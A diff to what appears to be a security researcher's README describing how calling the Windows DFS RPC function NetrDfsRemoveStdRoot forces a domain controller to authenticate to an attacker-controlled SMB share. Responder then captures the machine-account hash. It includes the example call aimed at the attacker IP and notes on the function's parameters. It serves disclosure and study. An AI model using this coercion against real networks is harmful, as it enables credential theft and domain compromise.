@@ -24,7 +24,7 @@ Then we need to connect to the remote SMB pipe `\PIPE\netdfs` and bind to the en
 The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named \PIPE\netdfs. This pipe is connected to the protocol [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) and allows to call RPC functions of this protocol. It will then call the remote [`NetrDfsRemoveStdRoot`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/e9da023d-554a-49bc-837a-69f22d59fd18) function on the Windows Server (192.168.2.1) with the following parameters:
 
 ```cpp
-NetrDfsRemoveStdRoot('192.168.2.51\x00', 'test\x00', 1)
+NetrDfsRemoveStdRoot('192.168.2.51\x00', 'share\x00', 0)
 ```
 
 We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
@@ -35,7 +35,7 @@ We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py
 
 ![](./imgs/poc.png)
 
-This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:
+This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:
 
 ![](./imgs/hash.png)
 
@@ -55,7 +55,9 @@ NET_API_STATUS NetrDfsRemoveStdRoot(
 
  - **ServerName**: The pointer to a null-terminated Unicode string. This is the host name of the DFS root target to be removed.
 
+
  - **RootShare**: The pointer to a null-terminated Unicode DFS root target share name string. This is also the DFS namespace name. The share is not removed automatically when the method is successful; it MUST be removed explicitly, as needed.
+
 
  - **ApiFlags**: This parameter is reserved for future use and is ignored by the server.
 
@@ -63,4 +65,8 @@ NET_API_STATUS NetrDfsRemoveStdRoot(
 
  - Documentation of protocol [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979
 
+
  - Documentation of function `NetrDfsRemoveStdRoot`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/e9da023d-554a-49bc-837a-69f22d59fd18
+
+
+ - This call was pointed out by [@filip_dragovic](https://twitter.com/filip_dragovic/) on Jul 18, 2021: https://twitter.com/filip_dragovic/status/1538154721655103488
